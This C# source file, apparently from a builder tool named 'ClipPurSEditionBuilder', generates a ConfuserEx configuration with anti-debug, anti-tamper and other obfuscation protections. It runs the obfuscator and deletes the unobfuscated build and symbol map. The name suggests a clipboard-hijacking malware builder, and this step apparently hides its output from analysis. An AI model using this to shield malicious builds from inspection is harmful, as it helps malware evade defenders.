using System.Text;
using System.Threading;
using ClipPurSEditionBuilder.Sticks;

namespace ClipPurSEditionBuilder.Mod
{
    public static class Packer
    {
        public static bool CreateProject(string basedir, string buildname)
        {
            var Builder = new StringBuilder();
            string combinepath = FileControl.CombinePath(basedir, buildname);

            Builder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-8\"?>"); // Задаём параметры для xml разметки
            Builder.AppendLine($@"<project outputDir=""Obfuscated"" baseDir=""{basedir}"" xmlns=""http://confuser.codeplex.com"">"); // Входная папка и выходная
            Builder.AppendLine("  <rule pattern=\"true\" inherit=\"false\">");
            Builder.AppendLine("   <protection id=\"constants\" />");
            Builder.AppendLine("   <protection id=\"ctrl flow\" />");
            Builder.AppendLine("   <protection id=\"ref proxy\" />");
            Builder.AppendLine("   <protection id=\"rename\" />");
            Builder.AppendLine("   <protection id=\"anti ildasm\" />");
            Builder.AppendLine("   <protection id=\"anti debug\" />");
            Builder.AppendLine("   <protection id=\"anti tamper\" />");
            Builder.AppendLine("   <protection id=\"invalid metadata\" />");
            Builder.AppendLine("   <protection id=\"resources\" />");
            Builder.AppendLine("  </rule>");
            Builder.AppendLine($@"  <module path=""{combinepath}"" />"); // Сам модуль файла который нужно шифровать
            Builder.AppendLine("</project>");

            if (Builder.Length > 0 && FileControl.ExistsDirectory(GlobalPath.ModConfuser))
            { 
                FileControl.CreateFile(GlobalPath.Config, Builder.ToString());
                Thread.Sleep(500);
                ProcessControl.RunCLI(GlobalPath.CLI, GlobalPath.Config);
                Clean(combinepath);
                return true;
            }
            else
            {
                return false;
            }
        }

        private static void Clean(string inputfile)
        {
            // Если есть папка: Obfuscated
            if (FileControl.ExistsDirectory(GlobalPath.Confused))
            {
                FileControl.FileDelete(inputfile); // Удаляем изначально первый билд файла ( до обфускации )
                FileControl.FileDelete(GlobalPath.Config); // Удаляем файл project.crproj
                FileControl.FileDelete(GlobalPath.SysbolsMap); // Удаляем файл Obfuscated\symbols.map
            }
        }
    }
}